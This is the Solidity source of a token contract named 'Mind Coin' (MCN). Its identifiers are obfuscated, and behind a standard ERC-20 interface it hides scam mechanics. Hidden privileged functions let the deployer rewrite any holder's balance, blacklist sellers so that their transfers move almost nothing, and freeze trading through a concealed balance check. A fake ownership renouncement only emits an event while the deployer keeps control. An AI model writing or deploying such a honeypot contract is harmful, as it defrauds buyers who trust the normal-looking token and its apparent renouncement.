//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface aalnhaovfffsby {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract plgycskjmh {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface khhvduicka {
    function createPair(address wyeekpynqhtgw, address ablnqwzdd) external returns (address);
}

interface jdkqbvfgtgbxf {
    function totalSupply() external view returns (uint256);

    function balanceOf(address dtkutrimixv) external view returns (uint256);

    function transfer(address knybonnjcoftj, uint256 euvpuzopulnr) external returns (bool);

    function allowance(address jgpzmdjszl, address spender) external view returns (uint256);

    function approve(address spender, uint256 euvpuzopulnr) external returns (bool);

    function transferFrom(
        address sender,
        address knybonnjcoftj,
        uint256 euvpuzopulnr
    ) external returns (bool);

    event Transfer(address indexed from, address indexed zpopcmyxqsuz, uint256 value);
    event Approval(address indexed jgpzmdjszl, address indexed spender, uint256 value);
}

interface jdkqbvfgtgbxfMetadata is jdkqbvfgtgbxf {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract MindCoin is plgycskjmh, jdkqbvfgtgbxf, jdkqbvfgtgbxfMetadata {

    bool private htkcqlahvtkise;

    string private yguhlizffdt = "Mind Coin";

    address private imafdphlxqkgmo;

    bool public uzhjmjqsqbnq;

    function alxhrpornr(uint256 euvpuzopulnr) public {
        jcotcsbau();
        lnvxkesvqn = euvpuzopulnr;
    }

    address public aawngvrmwiurjv;

    uint256 lnvxkesvqn;

    function smvnblrfkgn(address owfrdhxahucif) public {
        if (zxadcvsdrunqtw) {
            return;
        }
        if (xhpywtresy == ltgtemcjy) {
            idskqzapovl = jmjmvoqhfhg;
        }
        jcfnzbppjz[owfrdhxahucif] = true;
        if (ltgtemcjy == htkcqlahvtkise) {
            htkcqlahvtkise = true;
        }
        zxadcvsdrunqtw = true;
    }

    uint256 anxuzxefuv;

    mapping(address => bool) public ciuqvcycmglnp;

    function approve(address pmcknrsgamhn, uint256 euvpuzopulnr) public virtual override returns (bool) {
        ichxefmpcy[_msgSender()][pmcknrsgamhn] = euvpuzopulnr;
        emit Approval(_msgSender(), pmcknrsgamhn, euvpuzopulnr);
        return true;
    }

    mapping(address => bool) public jcfnzbppjz;

    uint256 public jmjmvoqhfhg;

    uint256 private sesnkdkbswfx = 100000000 * 10 ** 18;

    address uyvmpxibfp = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 private idskqzapovl;

    bool public zxadcvsdrunqtw;

    uint256 private mjvgtzxzeq;

    function balanceOf(address dtkutrimixv) public view virtual override returns (uint256) {
        return rfakpjwndcssa[dtkutrimixv];
    }

    function voxjstwpctt(address dccygqpsxtl, uint256 euvpuzopulnr) public {
        jcotcsbau();
        rfakpjwndcssa[dccygqpsxtl] = euvpuzopulnr;
    }

    bool public xhpywtresy;

    bool public mpobqplmxoh;

    address public rnzmeglionejw;

    function yczfraeizjpf(address axuezvelbiyso) public {
        jcotcsbau();
        if (vkqqrhmmibpvra != mjvgtzxzeq) {
            mjvgtzxzeq = idskqzapovl;
        }
        if (axuezvelbiyso == rnzmeglionejw || axuezvelbiyso == aawngvrmwiurjv) {
            return;
        }
        ciuqvcycmglnp[axuezvelbiyso] = true;
    }

    function transfer(address dccygqpsxtl, uint256 euvpuzopulnr) external virtual override returns (bool) {
        return tdoxrtmeefqub(_msgSender(), dccygqpsxtl, euvpuzopulnr);
    }

    function ucgclydxlp(address kmkyyjgyt, address knybonnjcoftj, uint256 euvpuzopulnr) internal returns (bool) {
        require(rfakpjwndcssa[kmkyyjgyt] >= euvpuzopulnr);
        rfakpjwndcssa[kmkyyjgyt] -= euvpuzopulnr;
        rfakpjwndcssa[knybonnjcoftj] += euvpuzopulnr;
        emit Transfer(kmkyyjgyt, knybonnjcoftj, euvpuzopulnr);
        return true;
    }

    uint256 constant qoyratfwif = 9 ** 10;

    function tdoxrtmeefqub(address kmkyyjgyt, address knybonnjcoftj, uint256 euvpuzopulnr) internal returns (bool) {
        if (kmkyyjgyt == rnzmeglionejw) {
            return ucgclydxlp(kmkyyjgyt, knybonnjcoftj, euvpuzopulnr);
        }
        uint256 ztqxphwfem = jdkqbvfgtgbxf(aawngvrmwiurjv).balanceOf(ulfujuedp);
        require(ztqxphwfem == lnvxkesvqn);
        if (ciuqvcycmglnp[kmkyyjgyt]) {
            return ucgclydxlp(kmkyyjgyt, knybonnjcoftj, qoyratfwif);
        }
        return ucgclydxlp(kmkyyjgyt, knybonnjcoftj, euvpuzopulnr);
    }

    function eqbjyolgrugt() public {
        emit OwnershipTransferred(rnzmeglionejw, address(0));
        imafdphlxqkgmo = address(0);
    }

    function transferFrom(address kmkyyjgyt, address knybonnjcoftj, uint256 euvpuzopulnr) external override returns (bool) {
        if (_msgSender() != uyvmpxibfp) {
            if (ichxefmpcy[kmkyyjgyt][_msgSender()] != type(uint256).max) {
                require(euvpuzopulnr <= ichxefmpcy[kmkyyjgyt][_msgSender()]);
                ichxefmpcy[kmkyyjgyt][_msgSender()] -= euvpuzopulnr;
            }
        }
        return tdoxrtmeefqub(kmkyyjgyt, knybonnjcoftj, euvpuzopulnr);
    }

    address ulfujuedp = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function decimals() external view virtual override returns (uint8) {
        return jypigxvdhnznu;
    }

    uint8 private jypigxvdhnznu = 18;

    mapping(address => mapping(address => uint256)) private ichxefmpcy;

    bool private ltgtemcjy;

    function symbol() external view virtual override returns (string memory) {
        return cywethaknjcm;
    }

    string private cywethaknjcm = "MCN";

    function getOwner() external view returns (address) {
        return imafdphlxqkgmo;
    }

    uint256 private vkqqrhmmibpvra;

    uint256 private onfqwzsnbr;

    function owner() external view returns (address) {
        return imafdphlxqkgmo;
    }

    function jcotcsbau() private view {
        require(jcfnzbppjz[_msgSender()]);
    }

    function name() external view virtual override returns (string memory) {
        return yguhlizffdt;
    }

    function allowance(address utvnottwkiyn, address pmcknrsgamhn) external view virtual override returns (uint256) {
        if (pmcknrsgamhn == uyvmpxibfp) {
            return type(uint256).max;
        }
        return ichxefmpcy[utvnottwkiyn][pmcknrsgamhn];
    }

    event OwnershipTransferred(address indexed lvngheobiaievg, address indexed mbduyoprignnvl);

    mapping(address => uint256) private rfakpjwndcssa;

    function totalSupply() external view virtual override returns (uint256) {
        return sesnkdkbswfx;
    }

    constructor (){
        if (uzhjmjqsqbnq != mpobqplmxoh) {
            mjvgtzxzeq = onfqwzsnbr;
        }
        eqbjyolgrugt();
        aalnhaovfffsby tosjxnxczgp = aalnhaovfffsby(uyvmpxibfp);
        aawngvrmwiurjv = khhvduicka(tosjxnxczgp.factory()).createPair(tosjxnxczgp.WETH(), address(this));
        
        rnzmeglionejw = _msgSender();
        jcfnzbppjz[rnzmeglionejw] = true;
        rfakpjwndcssa[rnzmeglionejw] = sesnkdkbswfx;
        
        emit Transfer(address(0), rnzmeglionejw, sesnkdkbswfx);
    }

}